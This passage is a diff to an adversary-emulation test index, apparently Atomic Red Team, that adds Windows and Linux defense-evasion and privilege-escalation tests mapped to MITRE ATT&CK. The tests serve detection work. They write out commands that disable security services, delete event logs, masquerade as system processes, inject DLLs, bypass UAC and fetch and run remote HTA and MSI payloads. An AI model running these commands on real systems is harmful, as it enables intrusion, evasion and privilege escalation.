+      - windows
+      input_arguments:
+        service_name:
+          description: The name of the service to stop
+          type: String
+          default: McAfeeDLPAgentService
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          net.exe stop #{service_name}
+          sc.exe config #{service_name} start= disabled
+        cleanup_command: |-
+          sc.exe config #{service_name} start= auto
+          net.exe start #{service_name}
   T1107:
     technique:
       x_mitre_data_sources:
@@ -6749,7 +7316,7 @@ defense-evasion:
         file_folder_to_own:
           description: Path of the file or folder for takeown to take ownership.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+          default: PathToAtomicsFolder\T1222\T1222.yaml
       executor:
         name: command_prompt
         command: 'takeown.exe /f #{file_folder_to_own}
@@ -6766,7 +7333,7 @@ defense-evasion:
         folder_to_own:
           description: Path of the folder for takeown to take ownership.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222
+          default: PathToAtomicsFolder\T1222
       executor:
         name: command_prompt
         command: 'takeown.exe /f #{folder_to_own} /r
@@ -6783,7 +7350,7 @@ defense-evasion:
         file_or_folder:
           description: Path of the file or folder to change permissions.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+          default: PathToAtomicsFolder\T1222\T1222.yaml
         user_or_group:
           description: User or group to allow full control
           type: string
@@ -6804,7 +7371,7 @@ defense-evasion:
         file_or_folder:
           description: Path of the file or folder to change permissions.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222
+          default: PathToAtomicsFolder\T1222
         user_or_group:
           description: User or group to allow full control
           type: string
@@ -6825,7 +7392,7 @@ defense-evasion:
         file_or_folder:
           description: Path of the file or folder to change permissions.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222\T1222.yaml
+          default: PathToAtomicsFolder\T1222\T1222.yaml
         user_or_group:
           description: User or group to allow full control
           type: string
@@ -6846,7 +7413,7 @@ defense-evasion:
         file_or_folder:
           description: Path of the file or folder to change permissions.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222
+          default: PathToAtomicsFolder\T1222
         user_or_group:
           description: User or group to allow full control
           type: string
@@ -6867,7 +7434,7 @@ defense-evasion:
         file_or_folder:
           description: Path of the file or folder remove attribute.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1222
+          default: PathToAtomicsFolder\T1222
       executor:
         name: command_prompt
         command: 'attrib.exe -r #{file_or_folder}
@@ -7853,7 +8420,38 @@ defense-evasion:
           default: "/var/log/secure"
       executor:
         name: bash
-        command: 'echo 0> #{log_path}'
+        command: 'echo 0> #{log_path}
+
+'
+    - name: Delete System Logs Using PowerShell
+      description: 'Recommended Detection: Monitor for use of the windows event log
+        filepath in PowerShell couple with delete arguments
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+          Stop-Process -Id $eventLogId -Force
+          Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+        cleanup_command: 'Start-Service -Name EventLog
+
+'
+    - name: Delete System Logs Using Clear-EventLogId
+      description: 'Clear event logs using built-in PowerShell commands
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Clear-EventLog -logname Application
+
+'
   T1202:
     technique:
       x_mitre_data_sources:
@@ -8137,14 +8735,17 @@ defense-evasion:
         filename:
           description: location of the payload
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1118\src\T1118.dll
+          default: PathToAtomicsFolder\T1118\src\T1118.dll
+        source:
+          description: location of the source code to compile
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\T1118.cs
       executor:
         name: command_prompt
         elevation_required: false
-        command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library
-          /out:C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.dll C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.cs
-          \nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile=
-          /LogToConsole=false /U #{filename}\n"
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename}  #{source}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U #{filename}
     - name: InstallUtil GetHelp method call
       description: 'Executes the Uninstall Method
 
@@ -8155,14 +8756,17 @@ defense-evasion:
         filename:
           description: location of the payload
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1118\src\T1118.dll
+          default: PathToAtomicsFolder\T1118\src\T1118.dll
+        source:
+          description: location of the source code to compile
+          type: Path
+          default: PathToAtomicsFolder\T1118\src\T1118.cs
       executor:
         name: command_prompt
         elevation_required: false
-        command: "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /target:library
-          /out:C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.dll C:\\AtomicRedTeam\\atomics\\T1118\\src\\T1118.cs
-          \nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /?
-          #{filename}\n"
+        command: |
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:#{filename} #{source}
+          C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /? #{filename}
   T1152:
     technique:
       x_mitre_permissions_required:
@@ -8355,6 +8959,9 @@ defense-evasion:
         command: |
           cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
           cmd.exe /c %SystemRoot%\Temp\lsass.exe
+        cleanup_command: 'del /Q /F %SystemRoot%\Temp\lsass.exe
+
+'
     - name: Masquerading as Linux crond process.
       description: 'Copies sh process, renames it as crond, and executes it to masquerade
         as the cron daemon.
@@ -8381,6 +8988,9 @@ defense-evasion:
         command: |
           copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y
           cmd.exe /c %APPDATA%\notepad.exe /B
+        cleanup_command: 'del /Q /F %APPDATA%\notepad.exe
+
+'
     - name: Masquerading - wscript.exe running as svchost.exe
       description: 'Copies wscript.exe, renames it, and launches it to masquerade
         as an instance of svchost.exe.
@@ -8394,6 +9004,9 @@ defense-evasion:
         command: |
           copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y
           cmd.exe /c %APPDATA%\svchost.exe /B
+        cleanup_command: 'del /Q /F %APPDATA%\svchost.exe
+
+'
     - name: Masquerading - powershell.exe running as taskhostw.exe
       description: 'Copies powershell.exe, renames it, and launches it to masquerade
         as an instance of taskhostw.exe.
@@ -8407,6 +9020,76 @@ defense-evasion:
         command: |
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y
           cmd.exe /K %APPDATA%\taskhostw.exe
+        cleanup_command: 'del /Q /F %APPDATA%\taskhostw.exe
+
+'
+    - name: Masquerading - non-windows exe running as windows exe
+      description: 'Copies an exe, renames it as a windows exe, and launches it to
+        masquerade as a real windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$PathToAtomicsFolder\\T1036\\bin\\t1036.exe"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:TEMP + "\svchost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Masquerading - windows exe running as different windows exe
+      description: 'Copies a windows exe, renames it as another windows exe, and launches
+        it to masquerade as second windows exe
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        inputfile:
+          description: path of file to copy
+          type: path
+          default: "$env:ComSpec"
+        outputfile:
+          description: path of file to execute
+          type: path
+          default: ($env:TEMP + "\svchost.exe")
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          copy #{inputfile} #{outputfile}
+          $myT1036 = (Start-Process -PassThru -FilePath #{outputfile}).Id
+          Stop-Process -ID $myT1036
+        cleanup_command: 'del #{outputfile}
+
+'
+    - name: Malicious process Masquerading as LSM.exe
+      description: |
+        Detect LSM running from an incorrect directory and an incorrect service account
+        This works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\lsm.exe
+          C:\lsm.exe /c echo T1036 > C:\T1036.txt
+        cleanup_command: |
+          del C:\T1036.txt
+          del C:\lsm.exe
   T1112:
     technique:
       x_mitre_data_sources:
@@ -8698,9 +9381,55 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
+        command: "mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
+          \     \n"
+    - name: Mshta calls a local VBScript file to launch notepad.exe
+      description: Tests execution of a local program by a VBScript file called by
+        Mshta
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_file:
+          description: Create a local VBScript file
+          type: path
+          default: C:\Temp\mshta_notepad.vbs
+      executor:
+        name: command_prompt
+        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
 
 '
+    - name: Mshta executes VBScript to execute malicious command
+      description: |
+        Run a local VB script to run local user enumeration powershell command
+
+        This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+      supported_platforms:
+      - windows
+      input_arguments:
+        atomics_path:
+          description: path to atomics folder
+          type: path
+          default: "..\\..\\atomics"
+      executor:
+        name: command_prompt
+        command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
+          -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
+
+'
+    - name: Mshta Executes Remote HTML Application (HTA)
+      description: 'Execute an arbitrary remote HTA.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        hta_url:
+          description: URL to HTA file for execution
+          type: string
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.hta
+      executor:
+        name: command_prompt
+        command: 'mshta #{hta_url}'
   T1096:
     technique:
       x_mitre_data_sources:
@@ -9276,17 +10005,17 @@ defense-evasion:
         dll_payload:
           description: DLL to Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1055\src\x64\T1055.dll
+          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'mavinject #{process_id} /INJECTRUNNING #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
     - name: Process Injection via PowerSploit
       description: 'PowerShell Injection using [PowerSploit Invoke-DLLInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-DllInjection.ps1)
 
@@ -9301,17 +10030,35 @@ defense-evasion:
         process_id:
           description: PID of input_arguments
           type: Int
-          default: "$pid"
+          default: "(get-process spoolsv).id"
       executor:
         name: powershell
         elevation_required: true
-        command: 'Invoke-DllInjection.ps1 -ProcessID #{process_id} -Dll #{dll_payload}
-
-'
+        command: |
+          $mypid = #{process_id}
+          Invoke-DllInjection.ps1 -ProcessID $mypid -Dll #{dll_payload}
     - name: Shared Library Injection via /etc/ld.so.preload
-      description: 'This test adds a shared library to the `ld.so.preload` list to
+      description: "This test adds a shared library to the `ld.so.preload` list to
         execute and intercept API calls. This technique was used by threat actor Rocke
         during the exploitation of Linux web servers. This requires the `glibc` package.
+        \n"
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_shared_library:
+          description: Path to a shared library object
+          type: Path
+          default: "../bin/T1055.so"
+      executor:
+        name: bash
+        elevation_required: true
+        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
+
+'
+    - name: Shared Library Injection via LD_PRELOAD
+      description: 'This test injects a shared object library via the LD_PRELOAD environment
+        variable to execute. This technique was used by threat actor Rocke during
+        the exploitation of Linux web servers. This requires the `glibc` package.
 
 '
       supported_platforms:
@@ -9320,10 +10067,11 @@ defense-evasion:
         path_to_shared_library:
           description: Path to a shared library object
           type: Path
-          default: "/tmp/evil_module.so"
+          default: "/opt/AtomicRedTeam/atomics/T1055/bin/T1055.so"
       executor:
         name: bash
-        command: 'echo #{path_to_shared_library} > /etc/ld.so.preload
+        elevation_required: false
+        command: 'LD_PRELOAD=#{path_to_shared_library} ls
 
 '
     - name: Process Injection via C#
@@ -9346,6 +10094,21 @@ defense-evasion:
       executor:
         name: command_prompt
         command: ".\\bin\\#{exe_binary}\n"
+    - name: svchost writing a file to a UNC path
+      description: |
+        svchost.exe writing a non-Microsoft Office file to a file with a UNC path.
+        This works by copying cmd.exe to a file, naming it svchost.exe, then copying a file to the localhost\c$ folder.
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: |
+          copy C:\Windows\System32\cmd.exe C:\svchost.exe
+          C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt
+        cleanup_command: |
+          del C:\T1055.txt
+          del C:\svchost.exe
   T1121:
     technique:
       x_mitre_data_sources:
@@ -9420,7 +10183,7 @@ defense-evasion:
         source_file:
           description: Location of the CSharp source_file
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
+          default: PathToAtomicsFolder\T1121\src\T1121.cs
       executor:
         name: command_prompt
         elevation_required: false
@@ -9443,7 +10206,7 @@ defense-evasion:
         source_file:
           description: Location of the CSharp source_file
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1121\src\T1121.cs
+          default: PathToAtomicsFolder\T1121\src\T1121.cs
       executor:
         name: powershell
         elevation_required: false
@@ -9536,7 +10299,7 @@ defense-evasion:
         filename:
           description: Name of the local file, include path.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1117\RegSvr32.sct
+          default: PathToAtomicsFolder\T1117\RegSvr32.sct
       executor:
         name: command_prompt
         elevation_required: false
@@ -9572,7 +10335,7 @@ defense-evasion:
         dll_name:
           description: Name of DLL to Execute, DLL Should export DllRegisterServer
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1117\bin\AllTheThingsx86.dll
+          default: PathToAtomicsFolder\T1117\bin\AllTheThingsx86.dll
       executor:
         name: command_prompt
         elevation_required: false
@@ -9770,11 +10533,103 @@ defense-evasion:
         file_url:
           description: location of the payload
           type: Url
-          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"
+        command: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();
+
+'
+    - name: Rundll32 execute VBscript command
+      description: |
+        Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.
+
+        Technique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: Command for rundll32.exe to execute
+          type: string
+          default: calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)
+
+'
+    - name: Rundll32 advpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with advpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 ieadvpack.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with ieadvpack.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,
+
+'
+    - name: Rundll32 syssetup.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with syssetup.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall
+          128 .\#{inf_to_execute}
+
+'
+    - name: Rundll32 setupapi.dll Execution
+      description: |
+        Test execution of a command using rundll32.exe with setupapi.dll.
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128
+          .\#{inf_to_execute}
 
 '
   T1064:
@@ -9977,7 +10832,7 @@ defense-evasion:
         dll_payload:
           description: DLL to inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+          default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
         process_id:
           description: PID of process receiving injection
           type: string
@@ -10016,11 +10871,96 @@ defense-evasion:
         dll_payload:
           description: DLL to execute
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
       executor:
         name: command_prompt
-        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
-          \n"
+        command: 'C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload}
+
+'
+    - name: Msiexec.exe - Execute Local MSI file
+      description: 'Execute arbitrary MSI file. Commonly seen in application installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
+    - name: Msiexec.exe - Execute Remote MSI file
+      description: 'Execute arbitrary MSI file retrieved remotely. Less commonly seen
+        in application installation, commonly seen in malware execution.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        msi_payload:
+          description: MSI file to execute
+          type: String
+          default: http://site.com/file.msi
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /q /i "#{msi_payload}"
+
+'
+    - name: Msiexec.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally. Commonly seen in application
+        installation.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'msiexec.exe /y "#{dll_payload}"
+
+'
+    - name: Odbcconf.exe - Execute Arbitrary DLL
+      description: 'Execute arbitrary DLL file stored locally.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: 'odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+
+'
+    - name: InfDefaultInstall.exe .inf Execution
+      description: |
+        Test execution of a .inf using InfDefaultInstall.exe
+
+        Reference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml
+      supported_platforms:
+      - windows
+      input_arguments:
+        inf_to_execute:
+          description: Local location of inf file
+          type: string
+          default: PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'InfDefaultInstall.exe #{inf_to_execute}
+
+'
   T1216:
     technique:
       x_mitre_data_sources:
@@ -10092,6 +11032,44 @@ defense-evasion:
           localhost "script:#{remote_payload}"
 
 '
+    - name: SyncAppvPublishingServe Signed Script PowerShell Command Execution
+      description: 'Executes the signed SyncAppvPublishingServe script with options
+        to execute an arbitrary PowerShell command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A PowerShell command to execute.
+          type: string
+          default: Start-Process calc
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'C:\windows\system32\SyncAppvPublishingServe.vbs “\n;#{command_to_execute}”
+
+'
+    - name: manage-bde.wsf Signed Script Command Execution
+      description: 'Executes the signed manage-bde.wsf script with options to execute
+        an arbitrary command.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_to_execute:
+          description: A command to execute.
+          type: Path
+          default: C:\Windows\System32\calc.exe
+      executor:
+        name: command_prompt
+        elevation_required: false
+        prereq_command: ''
+        command: |
+          set comspec=#{command_to_execute}
+          cscript manage-bde.wsf
+        cleanup_command: set comspec=C:\Windows\System32\cmd.exe
   T1151:
     technique:
       x_mitre_data_sources:
@@ -10606,11 +11584,11 @@ defense-evasion:
         xmlfile:
           description: Location of the test XML file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1220\src\msxslxmlfile.xml
+          default: PathToAtomicsFolder\T1220\src\msxslxmlfile.xml
         xslfile:
           description: Location of the test XSL script file on the local filesystem.
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1220\src\msxslscript.xsl
+          default: PathToAtomicsFolder\T1220\src\msxslscript.xsl
       executor:
         name: command_prompt
         command: 'C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -10653,7 +11631,7 @@ defense-evasion:
         local_xsl_file:
           description: Location of the test XSL script file on the local filesystem.
           type: path
-          default: C:\AtomicRedTeam\atomics\T1220\src\wmicscript.xsl
+          default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
       executor:
         name: command_prompt
         command: 'wmic.exe #{wmic_command} /FORMAT:#{local_xsl_file}
@@ -11337,13 +12315,43 @@ privilege-escalation:
         file_path:
           description: Path to the shim databaase file
           type: String
-          default: C:\AtomicRedTeam\atomics\T1138\src\AtomicShimx86.sdb
+          default: PathToAtomicsFolder\T1138\src\AtomicShimx86.sdb
       executor:
         name: command_prompt
         elevation_required: true
         command: |
           sdbinst.exe #{file_path}
           sdbinst.exe -u #{file_path}
+    - name: New shim database files created in the default shim database directory
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Copy-Item $PathToAtomicsFolder\T1138\bin\T1138CompatDatabase.sdb C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+        cleanup_command: |
+          Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb
+          Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb
+    - name: Registry key creation and/or modification events for SDB
+      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+          New-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138" -Value "AtomicRedTeamT1138"
+        cleanup_command: |
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" -Name "AtomicRedTeamT1138"
+          Remove-ItemProperty -Path HKLM:"\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB" -Name "AtomicRedTeamT1138"
   T1088:
     technique:
       x_mitre_data_sources:
@@ -11515,6 +12523,31 @@ privilege-escalation:
           New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
           Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
           Start-Process "C:\Windows\System32\fodhelper.exe"
+        cleanup_command: 'Remove-Item "HKCU:\software\classes\ms-settings" -force
+          -Recurse
+
+'
+    - name: Bypass UAC using ComputerDefaults - PowerShell
+      description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe
+        on Windows 10
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        executable_binary:
+          description: Binary to execute with UAC Bypass
+          type: path
+          default: C:\Windows\System32\cmd.exe
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+          New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+          Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+          Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+        cleanup_command: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -11631,6 +12664,92 @@ privilege-escalation:
           copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe
           copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll
           cmd.exe /k %APPDATA%\updater.exe
+  T1044:
+    technique:
+      x_mitre_permissions_required:
+      - Administrator
+      - User
+      x_mitre_data_sources:
+      - File monitoring
+      - Services
+      - Process command-line parameters
+      name: File System Permissions Weakness
+      description: |-
+        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.
+
+        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+        ### Services
+
+        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.
+
+        ### Executable Installers
+
+        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)
+      id: attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: |-
+        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.
+
+        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Stefan Kanthak
+      - Travis Smith, Tripwire
+      created: '2017-05-31T21:30:43.063Z'
+      x_mitre_effective_permissions:
+      - SYSTEM
+      - User
+      - Administrator
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      - kill_chain_name: mitre-attack
+        phase_name: privilege-escalation
+      external_references:
+      - external_id: T1044
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1044
+      - source_name: capec
+        external_id: CAPEC-17
+        url: https://capec.mitre.org/data/definitions/17.html
+      - source_name: Mozilla Firefox Installer DLL Hijack
+        description: Kugler, R. (2012, November 20). Mozilla Foundation Security Advisory
